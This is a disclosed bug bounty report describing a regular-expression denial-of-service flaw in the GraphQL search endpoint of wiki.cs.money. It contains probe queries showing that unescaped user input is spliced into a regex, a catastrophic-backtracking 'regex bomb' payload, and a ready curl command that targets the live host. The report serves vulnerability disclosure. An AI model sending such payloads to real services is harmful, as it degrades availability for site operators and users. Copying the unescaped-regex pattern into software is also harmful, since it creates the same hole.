# ReDoS at wiki.cs.money graphQL endpoint (AND probably a kind of command injection)

## Report Details
- **Report ID**: 1000567
- **URL**: https://hackerone.com/reports/1000567
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-07T02:26:35.361Z
- **Disclosed**: 2020-10-27T19:30:34.805Z

## Reporter
- **Username**: mvm
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: cs_money

## Vulnerability Information
## Summary:
The endpoint /graphql has a vulnerable query operation named "search", that  can I send a Regex malformed parameter, in order to trick the original regular expression to a regex bomb expression. 

+ Payload with a "common" search, querying the value "AAA":

```
query a { 
  search(q: "AAA", lang: "en") {
    _id
   weapon_id
    rarity
    collection{ _id name }
    collection_id 
 
 }
}
```

Response:

```
{
  "data": {
    "search": [
      {
        "_id": "sticker-baaa-ckstabber",
        "weapon_id": null,
        "rarity": "High Grade",
        "collection": null,
        "collection_id": null
      },
      {
        "_id": "sticker-ork-waaagh",
        "weapon_id": null,
        "rarity": "High Grade",
        "collection": null,
        "collection_id": null
      }
    ]
  },
  "extensions": {
    "tracing": {
      "version": 1,
      "startTime": "2020-10-07T02:07:55.251Z",
      "endTime": "2020-10-07T02:07:55.516Z",
      "duration": 264270190,
      "execution": {
        "resolvers": [
          {
            "path": [
              "search"
            ],...[Resumed for convenience]
        ]
      }
    }
  }
}
```

Pay attention in this part of JSON response: 

```
      "startTime": "2020-10-07T02:07:55.251Z",
      "endTime": "2020-10-07T02:07:55.516Z",
``` 

**It's about a instantaneously response time.**

Ok, now we're ready to play with this...

You can reveal the bug inserting "\u0000" on "q" parameter, in order to display an error with part of the graph query.

+ Payload A (see the error response):

 ```
query a { 
  search(q: "\u0000)", lang: "en") {
    _id
   weapon_id
    rarity
    collection{ _id name }
    collection_id  
 }
}
 ```

Response:

```
{
  "errors": [
    {
      "message": "value (?=.*\u0000) must not contain null bytes",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ],
      "path": [
        "search"
      ],
      "extensions": {
        "code": "INTERNAL_SERVER_ERROR"
      }
    }
  ],
....[Resumed]
 ```

+ Payload B (reveal that this parameter filter a value with a regex)

```
query a { 
  search(q: "\u0000)", lang: "en") {
    _id
   weapon_id
    rarity
    collection{ _id name }
    collection_id  
 }
}

```

 Response:

 ```
{
  "errors": [
    {
      "message": "Invalid regular expression: /(?=.*X))/: Unmatched ')'",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
...[Resumed]

```


## GraphQL Payload With Regex BOMB

```
query a { 
  search(q: "[a-zA-Z0-9]+\\s?)+$|^([a-zA-Z0-9.'\\w\\W]+\\s?)+$\\", lang: "en") {
    _id
   weapon_id
    rarity
    collection{ _id name }
    collection_id 
 }
}
```


## Steps To Reproduce:
  1. Send a POST with the bomb payload: 

       ````
   curl 'https://wiki.cs.money/graphql' \  
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' \
  -H 'content-type: application/json' \
  -H 'accept: */*' \     
  --data-binary $'{"query":"query a { \\n  search(q: \\"[a-zA-Z0-9]+\\\\\\\\s?)+$|^([a-zA-Z0-9.\'\\\\\\\\w\\\\\\\\W]+\\\\\\\\s?)+$\\\\\\\\\\", lang: \\"en\\") {\\n    _id\\n   weapon_id\\n    rarity\\n    collection{ _id name }\\n    collection_id \\n \\n }\\n}","variables":null}' \
  --compressed
       ```
  1. Compare response times with a simple query "AAA"  (explained above)
 

## Supporting Material/References:
https://www.rexegg.com/regex-explosive-quantifiers.html

## Impact

Denial of Service

## Attachments
- recording-bug.webm
